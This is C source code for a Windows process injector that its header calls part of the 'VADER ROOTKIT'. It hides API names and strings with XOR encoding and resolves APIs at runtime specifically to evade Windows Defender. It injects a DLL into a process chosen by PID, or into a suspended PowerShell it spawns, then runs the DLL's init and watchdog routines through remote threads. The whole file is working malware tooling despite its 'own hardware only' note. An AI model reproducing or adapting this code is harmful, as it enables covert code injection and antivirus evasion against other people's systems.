/*
 * vader_inject.c — Phase 4 Process Injector (Evasion Build)
 * VADER ROOTKIT — 22DIV / george wu
 *
 * v2: Dynamic API resolution + XOR string encryption.
 * v1 (annotated) caught by Defender RTP — IAT had VirtualAllocEx,
 * WriteProcessMemory, CreateRemoteThread in plain imports.
 *
 * Own hardware only — CSEC research
 */

#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdio.h>

#define XK 0xAC

static void xd(unsigned char *buf, const unsigned char *enc, int len) {
    int i;
    for (i = 0; i < len; i++) buf[i] = enc[i] ^ XK;
    buf[len] = 0;
}

static void sz(void *p, int len) {
    volatile char *v = (volatile char *)p;
    int i;
    for (i = 0; i < len; i++) v[i] = 0;
}

/* "powershell.exe" XOR 0xAC */
static const unsigned char xPowerShell[] = {
    0xDC, 0xC3, 0xDB, 0xC9, 0xDE, 0xDF, 0xC4, 0xC9,
    0xC0, 0xC0, 0x82, 0xC9, 0xD4, 0xC9
};
#define xPowerShell_LEN 14

/* "vader_inject.dll" XOR 0xAC */
static const unsigned char xDllName[] = {
    0xDA, 0xCD, 0xC8, 0xC9, 0xDE, 0xF3, 0xC5, 0xC2,
    0xC6, 0xC9, 0xCF, 0xD8, 0x82, 0xC8, 0xC0, 0xC0
};
#define xDllName_LEN 16

/* "VdrInit" XOR 0xAC */
static const unsigned char xInitFunc[] = {
    0xFA, 0xC8, 0xDE, 0xE5, 0xC2, 0xC5, 0xD8
};
#define xInitFunc_LEN 7

/* "VdrWatch" XOR 0xAC */
static const unsigned char xWatchFunc[] = {
    0xFA, 0xC8, 0xDE, 0xFB, 0xCD, 0xD8, 0xCF, 0xC4
};
#define xWatchFunc_LEN 8

/* Injection API names — XOR 0xAC */

/* "kernel32.dll" */
static const unsigned char xKernel32[] = {
    0xc7,0xc9,0xde,0xc2,0xc9,0xc0,0x9f,0x9e,0x82,0xc8,
    0xc0,0xc0
};
#define xKernel32_LEN 12

/* "VirtualAllocEx" */
static const unsigned char xVirtualAllocEx[] = {
    0xfa,0xc5,0xde,0xd8,0xd9,0xcd,0xc0,0xed,0xc0,0xc0,
    0xc3,0xcf,0xe9,0xd4
};
#define xVirtualAllocEx_LEN 14

/* "WriteProcessMemory" */
static const unsigned char xWriteProcessMemory[] = {
    0xfb,0xde,0xc5,0xd8,0xc9,0xfc,0xde,0xc3,0xcf,0xc9,
    0xdf,0xdf,0xe1,0xc9,0xc1,0xc3,0xde,0xd5
};
#define xWriteProcessMemory_LEN 18

/* "CreateRemoteThread" */
static const unsigned char xCreateRemoteThread[] = {
    0xef,0xde,0xc9,0xcd,0xd8,0xc9,0xfe,0xc9,0xc1,0xc3,
    0xd8,0xc9,0xf8,0xc4,0xde,0xc9,0xcd,0xc8
};
#define xCreateRemoteThread_LEN 18

/* "OpenProcess" */
static const unsigned char xOpenProcess[] = {
    0xe3,0xdc,0xc9,0xc2,0xfc,0xde,0xc3,0xcf,0xc9,0xdf,
    0xdf
};
#define xOpenProcess_LEN 11

/* "VirtualFreeEx" */
static const unsigned char xVirtualFreeEx[] = {
    0xfa,0xc5,0xde,0xd8,0xd9,0xcd,0xc0,0xea,0xde,0xc9,
    0xc9,0xe9,0xd4
};
#define xVirtualFreeEx_LEN 13

/* "CreateProcessA" */
static const unsigned char xCreateProcessA[] = {
    0xef,0xde,0xc9,0xcd,0xd8,0xc9,0xfc,0xde,0xc3,0xcf,
    0xc9,0xdf,0xdf,0xed
};
#define xCreateProcessA_LEN 14

/* "ResumeThread" */
static const unsigned char xResumeThread[] = {
    0xfe,0xc9,0xdf,0xd9,0xc1,0xc9,0xf8,0xc4,0xde,0xc9,
    0xcd,0xc8
};
#define xResumeThread_LEN 12

/* "TerminateProcess" */
static const unsigned char xTerminateProcess[] = {
    0xf8,0xc9,0xde,0xc1,0xc5,0xc2,0xcd,0xd8,0xc9,0xfc,
    0xde,0xc3,0xcf,0xc9,0xdf,0xdf
};
#define xTerminateProcess_LEN 16

/* "LoadLibraryA" */
static const unsigned char xLoadLibraryA[] = {
    0xe0,0xc3,0xcd,0xc8,0xe0,0xc5,0xce,0xde,0xcd,0xde,
    0xd5,0xed
};
#define xLoadLibraryA_LEN 12

/* "LoadLibraryExA" */
static const unsigned char xLoadLibraryExA[] = {
    0xe0,0xc3,0xcd,0xc8,0xe0,0xc5,0xce,0xde,0xcd,0xde,
    0xd5,0xe9,0xd4,0xed
};
#define xLoadLibraryExA_LEN 14

/* "WaitForSingleObject" */
static const unsigned char xWaitForSingleObject[] = {
    0xfb,0xcd,0xc5,0xd8,0xea,0xc3,0xde,0xff,0xc5,0xc2,
    0xcb,0xc0,0xc9,0xe3,0xce,0xc6,0xc9,0xcf,0xd8
};
#define xWaitForSingleObject_LEN 19

/* "CreateToolhelp32Snapshot" */
static const unsigned char xCreateToolhelp32Snapshot[] = {
    0xef,0xde,0xc9,0xcd,0xd8,0xc9,0xf8,0xc3,0xc3,0xc0,
    0xc4,0xc9,0xc0,0xdc,0x9f,0x9e,0xff,0xc2,0xcd,0xdc,
    0xdf,0xc4,0xc3,0xd8
};
#define xCreateToolhelp32Snapshot_LEN 24

/* "Module32First" */
static const unsigned char xModule32First[] = {
    0xe1,0xc3,0xc8,0xd9,0xc0,0xc9,0x9f,0x9e,0xea,0xc5,
    0xde,0xdf,0xd8
};
#define xModule32First_LEN 13

/* "Module32Next" */
static const unsigned char xModule32Next[] = {
    0xe1,0xc3,0xc8,0xd9,0xc0,0xc9,0x9f,0x9e,0xe2,0xc9,
    0xd4,0xd8
};
#define xModule32Next_LEN 12

/* "FreeLibrary" */
static const unsigned char xFreeLibrary[] = {
    0xea,0xde,0xc9,0xc9,0xe0,0xc5,0xce,0xde,0xcd,0xde,
    0xd5
};
#define xFreeLibrary_LEN 11

/* "CloseHandle" */
static const unsigned char xCloseHandle[] = {
    0xef,0xc0,0xc3,0xdf,0xc9,0xe4,0xcd,0xc2,0xc8,0xc0,
    0xc9
};
#define xCloseHandle_LEN 11

/* ═══════════════════════════════════════════════════════════════════
 * Dynamic API function pointer types
 * ═══════════════════════════════════════════════════════════════════ */

typedef LPVOID (WINAPI *fn_VirtualAllocEx)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL (WINAPI *fn_WriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
typedef HANDLE (WINAPI *fn_CreateRemoteThread)(HANDLE,LPSECURITY_ATTRIBUTES,SIZE_T,
    LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef HANDLE (WINAPI *fn_OpenProcess)(DWORD,BOOL,DWORD);
typedef BOOL (WINAPI *fn_VirtualFreeEx)(HANDLE,LPVOID,SIZE_T,DWORD);
typedef BOOL (WINAPI *fn_CreateProcessA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,
    LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *fn_ResumeThread)(HANDLE);
typedef BOOL (WINAPI *fn_TerminateProcess)(HANDLE,UINT);
typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef HMODULE (WINAPI *fn_LoadLibraryExA)(LPCSTR,HANDLE,DWORD);
typedef DWORD (WINAPI *fn_WaitForSingleObject)(HANDLE,DWORD);
typedef HANDLE (WINAPI *fn_CreateToolhelp32Snapshot)(DWORD,DWORD);
typedef BOOL (WINAPI *fn_Module32First)(HANDLE,LPMODULEENTRY32);
typedef BOOL (WINAPI *fn_Module32Next)(HANDLE,LPMODULEENTRY32);
typedef BOOL (WINAPI *fn_FreeLibrary)(HMODULE);
typedef BOOL (WINAPI *fn_CloseHandle)(HANDLE);

static fn_VirtualAllocEx          pVAE = NULL;
static fn_WriteProcessMemory      pWPM = NULL;
static fn_CreateRemoteThread      pCRT = NULL;
static fn_OpenProcess             pOP  = NULL;
static fn_VirtualFreeEx           pVFE = NULL;
static fn_CreateProcessA          pCPA = NULL;
static fn_ResumeThread            pRT  = NULL;
static fn_TerminateProcess        pTP  = NULL;
static fn_LoadLibraryA            pLLA = NULL;
static fn_LoadLibraryExA          pLLEA = NULL;
static fn_WaitForSingleObject     pWFSO = NULL;
static fn_CreateToolhelp32Snapshot pCTSS = NULL;
static fn_Module32First           pM32F = NULL;
static fn_Module32Next            pM32N = NULL;
static fn_FreeLibrary             pFL  = NULL;
static fn_CloseHandle             pCH  = NULL;

static BOOL resolve_apis(void) {
    HMODULE hK;
    unsigned char buf[64];

    xd((unsigned char*)buf, xKernel32, xKernel32_LEN);
    hK = GetModuleHandleA(buf);
    sz(buf, sizeof(buf));
    if (!hK) return FALSE;

#define R(var, enc, elen) do { \
    xd((unsigned char*)buf, enc, elen); \
    var = (void*)GetProcAddress(hK, buf); \
    sz(buf, sizeof(buf)); \
} while(0)

    R(pVAE,  xVirtualAllocEx, xVirtualAllocEx_LEN);
    R(pWPM,  xWriteProcessMemory, xWriteProcessMemory_LEN);
    R(pCRT,  xCreateRemoteThread, xCreateRemoteThread_LEN);
    R(pOP,   xOpenProcess, xOpenProcess_LEN);
    R(pVFE,  xVirtualFreeEx, xVirtualFreeEx_LEN);
    R(pCPA,  xCreateProcessA, xCreateProcessA_LEN);
    R(pRT,   xResumeThread, xResumeThread_LEN);
    R(pTP,   xTerminateProcess, xTerminateProcess_LEN);
    R(pLLA,  xLoadLibraryA, xLoadLibraryA_LEN);
    R(pLLEA, xLoadLibraryExA, xLoadLibraryExA_LEN);
    R(pWFSO, xWaitForSingleObject, xWaitForSingleObject_LEN);
    R(pCTSS, xCreateToolhelp32Snapshot, xCreateToolhelp32Snapshot_LEN);
    R(pM32F, xModule32First, xModule32First_LEN);
    R(pM32N, xModule32Next, xModule32Next_LEN);
    R(pFL,   xFreeLibrary, xFreeLibrary_LEN);
    R(pCH,   xCloseHandle, xCloseHandle_LEN);

#undef R

    return (pVAE && pWPM && pCRT && pOP && pCPA && pRT && pLLA && pWFSO && pCTSS);
}

/* ═══════════════════════════════════════════════════════════════════ */

static HANDLE hStdOut;
static void color(WORD c) { SetConsoleTextAttribute(hStdOut, c); }
#define RED     (FOREGROUND_RED | FOREGROUND_INTENSITY)
#define GREEN   (FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define YELLOW  (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY)
#define CYAN    (FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)
#define WHITE   (FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY)

static int get_dll_path(char *out, int outLen) {
    char *lastSlash;
    unsigned char dn[32];
    if (!GetModuleFileNameA(NULL, out, outLen)) return 0;
    lastSlash = strrchr(out, '\\');
    if (!lastSlash) return 0;
    lastSlash[1] = '\0';
    xd(dn, xDllName, xDllName_LEN);
    strcat(out, (char *)dn);
    sz(dn, sizeof(dn));
    return 1;
}

static HMODULE get_remote_module(DWORD pid, const char *modName) {
    HANDLE hSnap;
    MODULEENTRY32 me;
    hSnap = pCTSS(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnap == INVALID_HANDLE_VALUE) return NULL;
    me.dwSize = sizeof(MODULEENTRY32);
    if (pM32F(hSnap, &me)) {
        do {
            if (_stricmp(me.szModule, modName) == 0) {
                pCH(hSnap);
                return (HMODULE)me.modBaseAddr;
            }
        } while (pM32N(hSnap, &me));
    }
    pCH(hSnap);
    return NULL;
}

#define INJECT_ACCESS (PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | \
                       PROCESS_VM_WRITE | PROCESS_VM_READ | \
                       PROCESS_QUERY_INFORMATION)

static BOOL inject_and_watch(HANDLE hProcess, DWORD pid, const char *dllPath) {
    SIZE_T pathLen, written;
    LPVOID pRemoteBuf;
    HANDLE hThread;
    HMODULE hRemote, hLocal;
    FARPROC pLocalInit, pLocalWatch;
    DWORD_PTR initOffset, pRemoteInit, offset, pRemoteWatch;
    unsigned char nb[32], wb[16];

    pathLen = strlen(dllPath) + 1;
    color(YELLOW);
    printf("  [*] Allocating %zu bytes in target...\n", pathLen);

    pRemoteBuf = pVAE(hProcess, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuf) {
        color(RED); printf("  [!] Alloc failed: %lu\n", GetLastError());
        return FALSE;
    }
    color(GREEN); printf("  [+] Remote buffer at 0x%p\n", pRemoteBuf);

    if (!pWPM(hProcess, pRemoteBuf, dllPath, pathLen, &written)) {
        color(RED); printf("  [!] Write failed: %lu\n", GetLastError());
        pVFE(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        return FALSE;
    }
    color(GREEN); printf("  [+] Wrote %zu bytes\n", written);

    color(YELLOW); printf("  [*] Starting load thread...\n");
    hThread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLLA, pRemoteBuf, 0, NULL);
    if (!hThread) {
        color(RED); printf("  [!] Remote thread failed: %lu\n", GetLastError());
        pVFE(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        return FALSE;
    }
    color(GREEN); printf("  [+] Thread started\n");

    color(YELLOW); printf("  [*] Waiting for load...\n");
    pWFSO(hThread, 10000);
    pCH(hThread);

    xd(nb, xDllName, xDllName_LEN);
    hRemote = get_remote_module(pid, (char *)nb);
    sz(nb, sizeof(nb));

    if (!hRemote) {
        color(RED);
        printf("  [!] DLL not found in target — DllMain still ran\n");
        return TRUE;
    }
    color(GREEN); printf("  [+] DLL loaded at 0x%p in target\n", (void *)hRemote);

    hLocal = pLLEA(dllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hLocal) {
        color(YELLOW); printf("  [*] Local load failed — exports skipped\n");
        return TRUE;
    }

    xd(nb, xInitFunc, xInitFunc_LEN);
    pLocalInit = GetProcAddress(hLocal, (char *)nb);
    sz(nb, sizeof(nb));

    xd(wb, xWatchFunc, xWatchFunc_LEN);
    pLocalWatch = GetProcAddress(hLocal, (char *)wb);
    sz(wb, sizeof(wb));

    pRemoteInit = 0;
    pRemoteWatch = 0;

    if (pLocalInit) {
        initOffset = (DWORD_PTR)pLocalInit - (DWORD_PTR)hLocal;
        pRemoteInit = (DWORD_PTR)hRemote + initOffset;
    }
    if (pLocalWatch) {
        offset = (DWORD_PTR)pLocalWatch - (DWORD_PTR)hLocal;
        pRemoteWatch = (DWORD_PTR)hRemote + offset;
    }
    pFL(hLocal);

    if (pRemoteInit) {
        color(GREEN); printf("  [+] VdrInit at 0x%p\n", (void *)pRemoteInit);
        hThread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteInit, NULL, 0, NULL);
        if (hThread) {
            pWFSO(hThread, 10000);
            pCH(hThread);
            color(GREEN); printf("  [+] VdrInit completed\n");
        }
    }

    if (pRemoteWatch) {
        color(GREEN); printf("  [+] VdrWatch at 0x%p\n", (void *)pRemoteWatch);
        hThread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteWatch, NULL, 0, NULL);
        if (hThread) pCH(hThread);
        color(GREEN); printf("  [+] Watchdog active\n");
    }

    return TRUE;
}

static BOOL spawn_and_inject(const char *dllPath) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    unsigned char cmd[32];
    DWORD prevCount;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    xd(cmd, xPowerShell, xPowerShell_LEN);

    color(YELLOW); printf("  [*] Spawning suspended...\n");
    if (!pCPA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
              CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        color(RED); printf("  [!] Spawn failed: %lu\n", GetLastError());
        sz(cmd, sizeof(cmd));
        return FALSE;
    }
    sz(cmd, sizeof(cmd));

    color(GREEN); printf("  [+] PID %lu suspended\n", pi.dwProcessId);

    if (!inject_and_watch(pi.hProcess, pi.dwProcessId, dllPath)) {
        color(RED); printf("  [!] Injection failed — killing\n");
        pTP(pi.hProcess, 1);
        pCH(pi.hProcess);
        pCH(pi.hThread);
        return FALSE;
    }

    color(YELLOW); printf("  [*] Resuming...\n");
    prevCount = pRT(pi.hThread);
    color(GREEN); printf("  [+] Resumed (prev count: %lu)\n", prevCount);

#ifdef VDR_DEBUG
    printf("\n");
    color(CYAN);
    printf("  +===========================================+\n");
    printf("  |  INJECT DONE — PID %lu\n", pi.dwProcessId);
    printf("  +===========================================+\n");
#endif

    pCH(pi.hProcess);
    pCH(pi.hThread);
    return TRUE;
}

int main(int argc, char **argv) {
    char dllPath[MAX_PATH];
    DWORD targetPid;
    HANDLE hProcess;

    hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    if (!resolve_apis()) {
        printf("[-] API init failed\n");
        return 1;
    }

    if (argc < 2) {
#ifdef VDR_DEBUG
        printf("Usage: vader_inject.exe <PID|--spawn>\n");
#endif
        return 1;
    }

    if (!get_dll_path(dllPath, MAX_PATH)) {
        printf("[-] DLL path failed\n");
        return 1;
    }

    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL not found: %s\n", dllPath);
        return 1;
    }

    if (strcmp(argv[1], "--spawn") == 0) {
        if (!spawn_and_inject(dllPath)) return 1;
#ifdef VDR_DEBUG
        color(WHITE); printf("\n  -- DONE --\n\n");
#endif
        return 0;
    }

    targetPid = (DWORD)atoi(argv[1]);
    if (targetPid == 0) {
        printf("[-] Invalid PID: %s\n", argv[1]);
        return 1;
    }

    hProcess = pOP(INJECT_ACCESS, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] OpenProcess(%lu) failed: %lu\n", targetPid, GetLastError());
        return 1;
    }
    color(GREEN); printf("  [+] Opened PID %lu\n", targetPid);

    if (!inject_and_watch(hProcess, targetPid, dllPath)) {
        pCH(hProcess);
        return 1;
    }

#ifdef VDR_DEBUG
    printf("\n");
    color(CYAN);
    printf("  +===========================================+\n");
    printf("  |  INJECT DONE — PID %lu\n", targetPid);
    printf("  +===========================================+\n");
#endif

    pCH(hProcess);
#ifdef VDR_DEBUG
    color(WHITE); printf("\n  -- DONE --\n\n");
#endif
    return 0;
}
